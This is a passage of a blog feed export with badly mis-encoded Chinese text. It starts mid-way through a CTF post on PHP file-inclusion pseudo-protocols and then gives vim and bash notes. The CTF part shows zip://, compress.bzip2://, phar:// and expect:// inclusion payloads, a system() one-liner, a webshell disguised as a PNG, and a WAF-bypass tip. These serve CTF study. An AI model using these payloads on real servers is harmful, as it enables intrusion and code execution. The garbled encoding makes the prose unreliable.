ï¼Œå¹¶åœ¨å½“å‰ç›®å½•ä¸‹å»ºç«‹äº†shell.phpæ–‡ä»¶</p><h3 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h3><p><code>&lt;?php system(&#39;ls&#39;);?&gt;</code></p><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><p>å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚</span><br><span class="line">è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23ï¼ˆå³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰</span><br><span class="line">åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚</span><br><span class="line">ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://</span><br></pre></td></tr></table></figure></div><ol><li><code>zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</code>ï¼ˆ#ç¼–ç ä¸º%23ï¼‰</li></ol><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></div><p>2.compress.bzip2:&#x2F;&#x2F;file.bz2</p><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></div><p>3.compress.zlib:&#x2F;&#x2F;file.gz</p><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></div><h2 id="phar-x2F-x2F-ä¼ªåè®®"><a href="#phar-x2F-x2F-ä¼ªåè®®" class="headerlink" title="phar:&#x2F;&#x2F;ä¼ªåè®®"></a>phar:&#x2F;&#x2F;ä¼ªåè®®</h2><p>phar:&#x2F;&#x2F; æ˜¯ç”¨æ¥è§£å‹çš„ä¼ªåè®®<br>phar:&#x2F;&#x2F;ä¸ç®¡å‚æ•°ä¸­æ˜¯ä»€ä¹ˆæ‹“å±•åï¼Œéƒ½ä¼šè¢«å½“åšå‹ç¼©åŒ…<br>ç”¨æ³•ï¼š<code>?file=phar://å‹ç¼©åŒ…/å‹ç¼©æ–‡ä»¶</code><br>æ¯”å¦‚ï¼š<code>phar://xxx.png/shell.php</code><br><strong>åˆ©ç”¨phar:&#x2F;&#x2F; æ—¶ï¼ŒPHPé…ç½®æ–‡ä»¶éœ€è¦å¼€å¯allow_url_fopenå’Œallow_url_includeï¼Œå¹¶ä¸”PHPç‰ˆæœ¬è¦é«˜äº5.3.0</strong></p><blockquote><p>æ³¨æ„ï¼šå‹ç¼©åŒ…éœ€è¦ç”¨zip:&#x2F;&#x2F;ä¼ªåè®®å‹ç¼©è€Œä¸èƒ½ç”¨rar:&#x2F;&#x2F;ï¼Œå°†æœ¨é©¬æ–‡ä»¶å‹ç¼©åï¼Œæ”¹æˆä»»æ„åç¼€åéƒ½å¯ä»¥æ­£å¸¸ä½¿ç”¨</p></blockquote><p>å†™ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶shell.phpï¼Œç„¶åç”¨zip:&#x2F;&#x2F;ä¼ªåè®®å‹ç¼©æˆshell.zipï¼Œæœ€åä¿®æ”¹åç¼€åä¸º.pngï¼Œä¸Šä¼ å›¾ç‰‡<br>è¾“å…¥æµ‹è¯•ï¼š<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p><p>è¿™æ ·phar:&#x2F;&#x2F;å°±ä¼šå°†pngå½“åšzipå‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¹¶ä¸”è®¿é—®è§£å‹åçš„shell.phpæ–‡ä»¶</p><h2 id="expect-x2F-x2F-ä¼ªåè®®"><a href="#expect-x2F-x2F-ä¼ªåè®®" class="headerlink" title="expect:&#x2F;&#x2F;ä¼ªåè®®"></a>expect:&#x2F;&#x2F;ä¼ªåè®®</h2><p>expect:&#x2F;&#x2F;ä¼ªåè®®ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦å®‰è£…æ‹“å±•<br>ç”¨æ³•: <code>?file=expect://ls</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellä¸shell script</title>
      <link href="/2021/12/03/shell%E4%B8%8Eshell-script/"/>
      <url>/2021/12/03/shell%E4%B8%8Eshell-script/</url>
      
        <content type="html"><![CDATA[<h1 id="vimç¨‹åºç¼–è¾‘å™¨"><a href="#vimç¨‹åºç¼–è¾‘å™¨" class="headerlink" title="vimç¨‹åºç¼–è¾‘å™¨"></a>vimç¨‹åºç¼–è¾‘å™¨</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="vimä¸vi"><a href="#vimä¸vi" class="headerlink" title="vimä¸vi"></a>vimä¸vi</h3><p>vimæ˜¯viçš„é«˜çº§ç‰ˆæœ¬ï¼Œvimæœ‰è¯­æ³•é«˜äº®ç­‰</p><h2 id="vi-x2F-vimçš„ä½¿ç”¨"><a href="#vi-x2F-vimçš„ä½¿ç”¨" class="headerlink" title="vi&#x2F;vimçš„ä½¿ç”¨"></a>vi&#x2F;vimçš„ä½¿ç”¨</h2><h3 id="ç¼–è¾‘æ¨¡å¼"><a href="#ç¼–è¾‘æ¨¡å¼" class="headerlink" title="ç¼–è¾‘æ¨¡å¼"></a>ç¼–è¾‘æ¨¡å¼</h3><p>æ‰“å¼€å³æ˜¯é»˜è®¤æ¨¡å¼ï¼ˆä¸€èˆ¬æ¨¡å¼ï¼‰,è¾“å…¥i&#x2F;o&#x2F;r&#x2F;aä»»æ„ä¸€ä¸ªå­—æ¯ä¼šè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œä¸é™åˆ¶å¤§å°å†™ï¼Œi&#x2F;o&#x2F;aæ˜¯æ’å…¥ï¼Œræ˜¯æ›¿æ¢</p><blockquote><p>æ›¿æ¢æ¨¡å¼ï¼šç›´æ¥é”®å…¥å­—ç¬¦ï¼Œæ›¿æ¢å…‰æ ‡æ‰€åœ¨å­—ç¬¦</p><p>åœ¨vié‡Œï¼Œtabé”®å¾—åˆ°ç»“æœå’Œç©ºæ ¼ç¬¦å¾—åˆ°çš„ç»“æœä¸ä¸€æ ·</p></blockquote><h3 id="å‘½ä»¤è¡Œæ¨¡å¼"><a href="#å‘½ä»¤è¡Œæ¨¡å¼" class="headerlink" title="å‘½ä»¤è¡Œæ¨¡å¼"></a>å‘½ä»¤è¡Œæ¨¡å¼</h3><p>ä¸€èˆ¬æ¨¡å¼ä¸­ï¼Œè¾“å…¥<code>:</code> <code>/</code> <code>?</code>3ä¸ªä¸­çš„ä¸€ä¸ªå°±å¯ä»¥è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼</p><h3 id="è¿”å›ä¸€èˆ¬æ¨¡å¼"><a href="#è¿”å›ä¸€èˆ¬æ¨¡å¼" class="headerlink" title="è¿”å›ä¸€èˆ¬æ¨¡å¼"></a>è¿”å›ä¸€èˆ¬æ¨¡å¼</h3><p>Esc + <code>:wq</code></p><blockquote><p>å¼ºåˆ¶å†™å…¥<code>:wq!</code> å‰ææ˜¯å¯ä»¥æ”¹æƒé™</p><ul><li>w å†™å…¥ ï¼ˆä¹Ÿå¯ä»¥w[filename]è¡¨ç¤ºä¸ºå¦å­˜ä¸ºï¼‰</li><li>q ç¦»å¼€</li><li>ZZ æ²¡æ”¹åŠ¨å°±ä¸ä¿å­˜ç¦»å¼€ï¼Œæ”¹åŠ¨å°±ä¿å­˜åç¦»å¼€</li></ul></blockquote><h3 id="ç§»åŠ¨å…‰æ ‡"><a href="#ç§»åŠ¨å…‰æ ‡" class="headerlink" title="ç§»åŠ¨å…‰æ ‡"></a>ç§»åŠ¨å…‰æ ‡</h3><p>åœ¨ä¸€èˆ¬æ¨¡å¼ä¸‹ï¼Œé™¤é•¿æŒ‰å¤–ï¼Œå¯ä»¥å…ˆå†™æ¬¡æ•°å†æŒ‰é”®(<code>30-&gt;</code>ä¸ºå…‰æ ‡å‘å³ç§»åŠ¨30ä¸ªå­—ç¬¦)</p><blockquote><p>ç›´æ¥è¾“ï¼Œè¾“å…¥ä¸ä¼šå›æ˜¾åœ¨å±å¹•ä¸Š</p></blockquote><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Ctrl] + [f] å±å¹•â€œå‘ä¸‹â€ç§»åŠ¨ä¸€é¡µï¼Œç›¸å½“äº [Page Down]æŒ‰é”® ï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line">[Ctrl] + [b] å±å¹•â€œå‘ä¸Šâ€ç§»åŠ¨ä¸€é¡µï¼Œç›¸å½“äº [Page Up] æŒ‰é”®ï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line">[Ctrl] + [d] å±å¹•â€œå‘ä¸‹â€ç§»åŠ¨åŠé¡µ</span><br><span class="line">[Ctrl] + [u] å±å¹•â€œå‘ä¸Šâ€ç§»åŠ¨åŠé¡µ</span><br><span class="line">+           å…‰æ ‡ç§»åŠ¨åˆ°éç©ºç™½å­—ç¬¦çš„ä¸‹ä¸€è¡Œ</span><br><span class="line">-           å…‰æ ‡ç§»åŠ¨åˆ°éç©ºç™½å­—ç¬¦çš„ä¸Šä¸€è¡Œ</span><br><span class="line">n + ç©ºæ ¼é”®  å…‰æ ‡ä¼šå‘å³ç§»åŠ¨è¿™ä¸€è¡Œçš„ n ä¸ªå­—ç¬¦</span><br><span class="line">0 æˆ–åŠŸèƒ½é”®[Home] ç§»åŠ¨åˆ°è¿™ä¸€è¡Œçš„æœ€å‰é¢å­—ç¬¦å¤„ï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">æˆ–åŠŸèƒ½é”®[End]  ç§»åŠ¨åˆ°è¿™ä¸€è¡Œçš„æœ€åé¢å­—ç¬¦å¤„ï¼ˆå¸¸ç”¨ï¼‰</span></span><br><span class="line">H  å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„æœ€ä¸Šæ–¹é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">M  å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„ä¸­å¤®é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">L  å…‰æ ‡ç§»åŠ¨åˆ°è¿™ä¸ªå±å¹•çš„æœ€ä¸‹æ–¹é‚£ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">G  ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„æœ€åä¸€è¡Œï¼ˆå¸¸ç”¨ï¼‰</span><br><span class="line">nG ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„ç¬¬ n è¡Œ</span><br><span class="line">gg ç§»åŠ¨åˆ°è¿™ä¸ªæ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼Œç›¸å½“äº 1G</span><br><span class="line">n&lt;Enter&gt;  å…‰æ ‡å‘ä¸‹ç§»åŠ¨ n è¡Œ</span><br></pre></td></tr></table></figure></div><h3 id="å—é€‰æ‹©â€“visual-blockæ¨¡å¼"><a href="#å—é€‰æ‹©â€“visual-blockæ¨¡å¼" class="headerlink" title="å—é€‰æ‹©â€“visual blockæ¨¡å¼"></a>å—é€‰æ‹©â€“visual blockæ¨¡å¼</h3><p>åœ¨ä¸€èˆ¬æ¨¡å¼ä¸­æŒ‰ä¸‹væˆ–Vè¿›å…¥</p><p>æ­¤æ—¶å…‰æ ‡ç»è¿‡ä½ç½®ä¼šè¢«é€‰ä¸­ï¼Œå¯ä»¥è¿›è¡Œä»¥ä¸‹å…·ä½“æ“ä½œ</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y å°†é€‰ä¸­çš„åœ°æ–¹å¤åˆ¶èµ·æ¥</span><br><span class="line">d å°†é€‰ä¸­çš„åœ°æ–¹åˆ é™¤</span><br><span class="line">p å°†åˆšåˆšyçš„å†…å®¹ç²˜è´´</span><br></pre></td></tr></table></figure></div><blockquote><p>å¤åˆ¶çš„å†…å®¹åªåœ¨å½“å‰vimçª—å£ç”Ÿæ•ˆï¼Œæ²¡æœ‰è¿›å…¥ç”µè„‘å‰ªåˆ‡æ¿</p></blockquote><h3 id="å¤šæ–‡ä»¶ç¼–è¾‘"><a href="#å¤šæ–‡ä»¶ç¼–è¾‘" class="headerlink" title="å¤šæ–‡ä»¶ç¼–è¾‘"></a>å¤šæ–‡ä»¶ç¼–è¾‘</h3><p>:n ç¼–è¾‘ä¸‹ä¸€ä¸ªæ–‡ä»¶</p><p>:N ç¼–è¾‘ä¸Šä¸€ä¸ªæ–‡ä»¶</p><p>:files åˆ—å‡ºç›®å‰è¿™ä¸ªvimçš„æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶</p><blockquote><p>vimåé¢å¯ä»¥è·Ÿå¤šä¸ªæ–‡ä»¶å,å¦‚æœæœ‰æ–‡ä»¶å†…å®¹ç›¸åŒçš„æ–‡ä»¶ï¼Œåªä¼šè¯»å–ç¬¬ä¸€ä¸ªï¼Œåé¢é‡å¤çš„ä¼šç›´æ¥è·³è¿‡</p></blockquote><h3 id="å¤šçª—å£"><a href="#å¤šçª—å£" class="headerlink" title="å¤šçª—å£"></a>å¤šçª—å£</h3><p>:sp[filename]</p><blockquote><p>filenameå¯æœ‰å¯æ— ï¼Œå¦‚æœæƒ³åœ¨æ–°çª—å£å¯åŠ¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œå°±åŠ filenameï¼Œå¦åˆ™é»˜è®¤åœ¨ä½¿å½“å‰æ–‡ä»¶å‡ºç°åœ¨ä¸¤ä¸ªçª—å£</p></blockquote><p>ctrl+w+j ç§»åˆ°ä¸‹é¢çš„çª—å£</p><p>ctrl+w+k ç§»åˆ°ä¸Šé¢çš„çª—å£</p><p>ctrl+w+q é€€å‡º</p><h2 id="vimç¯å¢ƒè®¾ç½®"><a href="#vimç¯å¢ƒè®¾ç½®" class="headerlink" title="vimç¯å¢ƒè®¾ç½®"></a>vimç¯å¢ƒè®¾ç½®</h2><h3 id="x2F-viminfo"><a href="#x2F-viminfo" class="headerlink" title="~&#x2F;.viminfo"></a>~&#x2F;.viminfo</h3><p>ä¸»åŠ¨è®°å½•æ“ä½œ</p><h3 id="x2F-vimrc-ç¯å¢ƒè®¾ç½®å‚æ•°"><a href="#x2F-vimrc-ç¯å¢ƒè®¾ç½®å‚æ•°" class="headerlink" title="~&#x2F;.vimrc ç¯å¢ƒè®¾ç½®å‚æ•°"></a>~&#x2F;.vimrc ç¯å¢ƒè®¾ç½®å‚æ•°</h3><p><strong>set nu</strong><br><strong>set nonu</strong></p><blockquote><p>è®¾ç½®è¡Œå·</p></blockquote><p><strong>set hlsearch</strong><br><strong>set noglsear</strong></p><p>hlsearch(&#x3D;high light search é«˜äº®åº¦æŸ¥æ‰¾)ï¼Œè®¾ç½®æ˜¯å¦å°†æŸ¥æ‰¾çš„<a class="link"   href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020" >å­—ç¬¦ä¸² <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>åç™½çš„è®¾ç½®å€¼</p><p><strong>set autoindent</strong><br><strong>set noautoindent</strong></p><blockquote><p>è¡¨ç¤ºæ˜¯å¦è‡ªåŠ¨ç¼©æ’</p></blockquote><p><strong>set backup</strong><br><strong>set nobackup</strong></p><blockquote><p>è¡¨ç¤ºè‡ªåŠ¨ä¿å­˜å¤‡ä»½æ–‡ä»¶ï¼Œä¸€èˆ¬è®¾ç½®ä¸º nobackup ï¼Œå¦‚æœè®¾ç½®ä¸ºbackupçš„è¯ï¼Œå½“ä½ æ”¹åŠ¨ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒåŸæ–‡ä»¶ä¼šè¢«ä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶åä¸º filename~ çš„æ–‡ä»¶ã€‚</p></blockquote><p><strong>set ruler</strong></p><blockquote><p>è®¾ç½®å³ä¸‹è§’çš„çŠ¶æ€æ è¯´æ˜</p></blockquote><p><strong>set showmode</strong></p><blockquote><p>æ˜¾ç¤º insert ä¹‹ç±»çš„å­—</p></blockquote><p><strong>set backspace&#x3D;(0 1 2)</strong></p><blockquote><p>è®¾ç½® 2 è¡¨ç¤ºè¿›å…¥ç¼–è¾‘æ¨¡å¼åå¯ä»¥åˆ é™¤ä»»æ„å­—ç¬¦ï¼Œ è®¾ç½® 0 æˆ– 1 è¡¨ç¤ºè¿›å…¥ç¼–è¾‘æ¨¡å¼ååªèƒ½åˆ é™¤åˆšæ‰è¾“å…¥çš„å­—ç¬¦ï¼Œä¸èƒ½åˆ é™¤åŸæœ¬å°±å­˜åœ¨çš„å­—ç¬¦äº†</p></blockquote><p><strong>set all</strong></p><blockquote><p>æ˜¾ç¤ºç›®å‰æ‰€æœ‰çš„ç¯å¢ƒå‚æ•°è®¾ç½®å€¼</p></blockquote><p><strong>set</strong></p><blockquote><p>æ˜¾ç¤ºä¸ç³»ç»Ÿé»˜è®¤å€¼ä¸åŒçš„è®¾ç½®å‚æ•°ï¼Œå°±æ˜¯ç”¨æˆ·è‡ªå·±å˜åŠ¨è¿‡çš„è®¾ç½®å‚æ•°</p></blockquote><p><strong>syntax on</strong><br><strong>syntax off</strong></p><blockquote><p>æ˜¯å¦æ ¹æ®ç¨‹åºç›¸å…³è¯­æ³•æ˜¾ç¤ºä¸åŒé¢œè‰²ã€‚</p></blockquote><p><strong>set bg&#x3D;dark</strong><br><strong>set bg&#x3D;light</strong></p><blockquote><p>æ˜¾ç¤ºä¸åŒçš„åº•è‰²è‰²è°ƒ</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334530.jpg"                      alt="image-20220918163650086"                ><figcaption>image-20220918163650086</figcaption></figure></p><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><h3 id="ä¸­æ–‡ç¼–ç "><a href="#ä¸­æ–‡ç¼–ç " class="headerlink" title="ä¸­æ–‡ç¼–ç "></a>ä¸­æ–‡ç¼–ç </h3><p>ä¸€èˆ¬éƒ½ä¸ºutf8,ä½†è‹¥vimæ‰“å¼€big5ç¼–ç ï¼Œä¼šæœ‰ä¹±ç ï¼Œæ­¤æ—¶å¯ä»¥è®¾ç½®LANGå±æ€§</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ  test LANG=zh_CN.big5</span><br></pre></td></tr></table></figure></div><h3 id="è¯­ç³»ç¼–ç è½¬æ¢"><a href="#è¯­ç³»ç¼–ç è½¬æ¢" class="headerlink" title="è¯­ç³»ç¼–ç è½¬æ¢"></a>è¯­ç³»ç¼–ç è½¬æ¢</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iconv [options]</span><br><span class="line">iconv -f åŸç¼–ç  -t æ–°ç¼–ç  filename [-o newfile]</span><br><span class="line">--list åˆ—å‡ºæ”¯æŒçš„è¯­ç³»æ•°æ®</span><br><span class="line">-f åæ¥åŸæ¥çš„ç¼–ç æ ¼å¼</span><br><span class="line">-t åæ¥åæ¥çš„ğŸ†•ç¼–ç æ ¼å¼</span><br><span class="line">-o file å¦‚æœè¦ä¿ç•™åŸæœ¬çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆä½¿ç”¨-o æ–°æ–‡ä»¶åï¼Œå¯ä»¥å»ºç«‹æ–°ç¼–ç æ–‡ä»¶</span><br></pre></td></tr></table></figure></div><h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><h2 id="åŸºæœ¬åŠŸèƒ½"><a href="#åŸºæœ¬åŠŸèƒ½" class="headerlink" title="åŸºæœ¬åŠŸèƒ½"></a>åŸºæœ¬åŠŸèƒ½</h2><h3 id="å‘½ä»¤è®°å¿†èƒ½åŠ›-history"><a href="#å‘½ä»¤è®°å¿†èƒ½åŠ›-history" class="headerlink" title="å‘½ä»¤è®°å¿†èƒ½åŠ› history"></a>å‘½ä»¤è®°å¿†èƒ½åŠ› history</h3><p>å¯ä»¥æŸ¥çœ‹ä¹‹å‰ç”¨è¿‡çš„å‘½ä»¤</p><h3 id="å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨åŠŸèƒ½-Tabé”®"><a href="#å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨åŠŸèƒ½-Tabé”®" class="headerlink" title="å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨åŠŸèƒ½(Tabé”®)"></a>å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨åŠŸèƒ½(Tabé”®)</h3><p><code>c[Tab][Tab]</code> å›æ˜¾æ‰€æœ‰cå¼€å¤´å‘½ä»¤</p><blockquote><p>ä¸€ä¸²å‘½ä»¤çš„ç¬¬ä¸€ä¸ªå­—ååŠ Tabåˆ™ä¸ºå‘½ä»¤è¡¥å…¨</p><p>ç¬¬äºŒä¸ªå­—ååŠ Tabä¸ºæ–‡ä»¶è¡¥é½</p></blockquote><h3 id="å‘½ä»¤è®¾ç½®åˆ«å-alias"><a href="#å‘½ä»¤è®¾ç½®åˆ«å-alias" class="headerlink" title="å‘½ä»¤è®¾ç½®åˆ«å alias"></a>å‘½ä»¤è®¾ç½®åˆ«å alias</h3><p><code>alias lm=&#39;ls -al&#39;</code> ç›¸å½“äºç»™<code>ls -al</code>å‘½ä»¤åŠ äº†ä¸ªç¼©å†™æ ‡è¯†ç¬¦ï¼Œè¾“å…¥lmåˆ™ä¼šæ‰§è¡Œè¯¥å‘½ä»¤</p><h3 id="æ§åˆ¶"><a href="#æ§åˆ¶" class="headerlink" title="æ§åˆ¶"></a>æ§åˆ¶</h3><p>ctrl+c ä¸­æ–­è¿›ç¨‹</p><h3 id="shell-script"><a href="#shell-script" class="headerlink" title="shell script"></a>shell script</h3><p>å¯ä»¥æ‰¹é‡å¤„ç†æ–‡ä»¶</p><h3 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h3><h3 id="typeå‘½ä»¤"><a href="#typeå‘½ä»¤" class="headerlink" title="typeå‘½ä»¤"></a>typeå‘½ä»¤</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type [-tpa] name</span><br><span class="line">ä¸åŠ ä»»ä½•optionsæ—¶ï¼Œä¼šå›æ˜¾nameæ˜¯å†…ç½®å‘½ä»¤è¿˜æ˜¯å¤–ç½®å‘½ä»¤</span><br><span class="line">-t å›æ˜¾ä¸º file/alias/builtion åˆ†åˆ«è¡¨ç¤ºå¤–éƒ¨å‘½ä»¤ã€åˆ«åã€å†…ç½®å‘½ä»¤</span><br><span class="line">-p nameä¸ºå¤–éƒ¨å‘½ä»¤æ—¶å›æ˜¾å®Œæ•´æ–‡ä»¶å</span><br><span class="line">-a ä»PATHå˜é‡å®šä¹‰çš„è·¯å¾„ä¸­ï¼Œå°†å«nameçš„å‘½ä»¤éƒ½åˆ—å‡ºæ¥ï¼ŒåŒ…å«alias</span><br></pre></td></tr></table></figure></div><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>å¯æ”¯æŒå¤šè¡Œæ‰§è¡Œï¼Œè¿™ä¹Ÿæœ‰åˆ©äºctfé¢˜ç›®ä¸­çš„ç»•è¿‡waf</p><p>ä¸»è¦åˆ©ç”¨åæ–œæ <code>\</code>,åŸç†ä¸ºå°†åŠŸèƒ½ä¸ºå‘½ä»¤æ‰§è¡Œçš„å›è½¦ç¬¦è½¬ä¹‰äº†ï¼Œä½¿å¾—å‘½ä»¤å¯ä»¥åœ¨ä¸‹ä¸€è¡Œç»§ç»­è¾“å…¥ï¼ˆç»ˆç«¯ä¸­ä¼šä»¥&gt;å¼€å¤´æç¤ºè¾“å…¥ï¼‰</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  test cp 1 2 \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">test1</span></span><br></pre></td></tr></table></figure></div><h2 id="shellå˜é‡"><a href="#shellå˜é‡" class="headerlink" title="shellå˜é‡"></a>shellå˜é‡</h2><p>ä¸€èˆ¬å¤§å†™çš„æ˜¯ç³»ç»Ÿé»˜è®¤å˜é‡(PATHã€SHELLã€HOMEç­‰)ï¼Œå°å†™æ˜¯å‘½ä»¤</p><blockquote><p>å¦‚æœè¦<code>echo</code>å†…ç½®å˜é‡ï¼Œè¦åœ¨å˜é‡åå‰åŠ <code>$</code></p></blockquote><h3 id="å˜é‡çš„æ˜¾ç¤ºä¸è®¾ç½®"><a href="#å˜é‡çš„æ˜¾ç¤ºä¸è®¾ç½®" class="headerlink" title="å˜é‡çš„æ˜¾ç¤ºä¸è®¾ç½®"></a>å˜é‡çš„æ˜¾ç¤ºä¸è®¾ç½®</h3><ul><li><p>æ‰“å° <code>echo $å˜é‡å</code> &#x2F; <code>echo $&#123;å˜é‡å&#125;</code></p></li><li><p>è®¾ç½® </p><ul><li><code>å˜é‡å=å€¼</code></li></ul></li><li><p>è®¾ç½®è§„åˆ™</p><ul><li>ç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œèµ‹å€¼åŠå˜é‡åä¸­ä¹Ÿä¸èƒ½æœ‰ç©ºæ ¼(å¦‚æœå€¼è¢«åŒå¼•å·æˆ–å•å¼•å·åŒ…è£¹æ—¶å¯ä»¥æœ‰ç©ºæ 